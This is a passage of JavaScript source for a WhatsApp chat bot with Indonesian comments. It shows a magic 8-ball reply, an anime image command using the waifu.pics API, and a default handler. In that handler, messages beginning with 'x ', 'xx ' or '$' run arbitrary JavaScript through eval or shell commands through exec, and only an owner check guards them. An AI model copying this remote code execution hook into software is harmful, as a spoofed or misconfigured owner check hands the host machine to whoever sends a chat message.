  m.reply(`*🎱 MAGIC 8-BALL*\n\nPertanyaan: ${text}\n\nJawaban: *${randomAnswer}*`);
}
break;

case "waifu": case "wifu": {
    try {
        // Cooldown 2 detik
        const cooldown = 2000;
        if (!global.waifuCooldown) global.waifuCooldown = {};
        if (global.waifuCooldown[m.sender] && Date.now() - global.waifuCooldown[m.sender] < cooldown) {
            return;
        }
        global.waifuCooldown[m.sender] = Date.now();
        
        // React loading
        await sock.sendMessage(m.chat, {
            react: {
                text: "⏳",
                key: m.key
            }
        });
        
        // API waifu
        const { data } = await axios.get('https://api.waifu.pics/sfw/waifu');
        
        if (!data || !data.url) return;
        
        // Get image buffer
        const imageBuffer = await getBuffer(data.url);
        
        // Kirim gambar tanpa caption
        const message = {
            image: imageBuffer,
            footer: global.namaBot || 'WhatsApp Bot',
            headerType: 1,
            buttons: [
                { buttonId: `${prefix}wifu`, buttonText: { displayText: 'Next ⏭️' }, type: 1 }
            ]
        };
        
        const sentMsg = await sock.sendMessage(m.chat, message, { quoted: m });
        
        // Simpan data untuk button handler-
        if (!global.waifuData) global.waifuData = {};
        global.waifuData[sentMsg.key.id] = {
            userId: m.sender,
            imageUrl: data.url
        };
        
        // Auto delete data setelah 3 menit
        setTimeout(() => {
            if (global.waifuData[sentMsg.key.id]) {
                delete global.waifuData[sentMsg.key.id];
            }
        }, 3 * 60 * 1000);
        
    } catch (error) {
        console.error('Error waifu command:', error);
    }
}
break;

//==================================//

default:
if (m.text.toLowerCase().startsWith("xx ")) {
  if (!isCreator) return;
  try {
    const r = await eval(`(async()=>{${text}})()`);
    sock.sendMessage(m.chat, { text: util.format(typeof r === "string" ? r : util.inspect(r)) }, { quoted: m });
  } catch (e) {
    sock.sendMessage(m.chat, { text: util.format(e) }, { quoted: m });
  }
}

if (m.text.toLowerCase().startsWith("x ")) {
  if (!isCreator) return;
  try {
    let r = await eval(text);
    sock.sendMessage(m.chat, { text: util.format(typeof r === "string" ? r : util.inspect(r)) }, { quoted: m });
  } catch (e) {
    sock.sendMessage(m.chat, { text: util.format(e) }, { quoted: m });
  }
}

if (m.text.startsWith('$')) {
  if (!isCreator) return;
  exec(m.text.slice(2), (e, out) =>
    sock.sendMessage(m.chat, { text: util.format(e ? e : out) }, { quoted: m })
  );
}}

//==================================//

} catch (err) {
console.log(err)
}
}

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.white("[•] Update"), chalk.white(`${__filename}\n`))
delete require.cache[file]
require(file)
})